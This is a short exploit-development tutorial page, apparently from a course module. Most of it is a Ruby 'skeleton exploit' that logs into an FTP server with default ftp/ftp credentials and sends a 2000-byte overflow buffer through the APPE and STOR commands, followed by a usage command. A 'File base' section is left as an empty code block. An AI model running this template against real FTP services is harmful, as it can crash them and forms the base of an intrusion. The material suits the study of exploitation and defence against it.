# Module 0x5 | Exploitation KungFu

## Skeleton exploit

It's really a good thing to have a skeleton exploit to edit and use quickly during your exploitation process. 

### Network base 

```ruby
#!/usr/bin/env ruby
# 
#
require 'socket'

buffer = "A" * 2000

#--> Networking
host = ARGV[0]
port = ARGV[1] || 21

s = TCPSocket.open(host, port)
s.recv(1024)
puts "[+] Sending Username."
s.send("USER ftp\r\n", 0)
s.recv(1024)
puts "[+] Sending Password."
s.send("PASS ftp\r\n", 0)
s.recv(1024)
puts "[+] Sending Evil buffer..."
s.send("APPE " + buffer + "\r\n", 0)
total = s.send("STOR " + buffer + "\r\n", 0)
#--> Exploit Info
puts "[+] " + "Total exploit size: " + "#{total} bytes."
puts "[+] " + " Buffer length: " + "#{buffer.size} bytes."
puts "[+] Done"

s.close
```
To execute it
```
ruby ftp_exploit.rb [TARGET] [PORT]
```
Notice that some services has to receive from it and some does not.

### File base 

```ruby

```
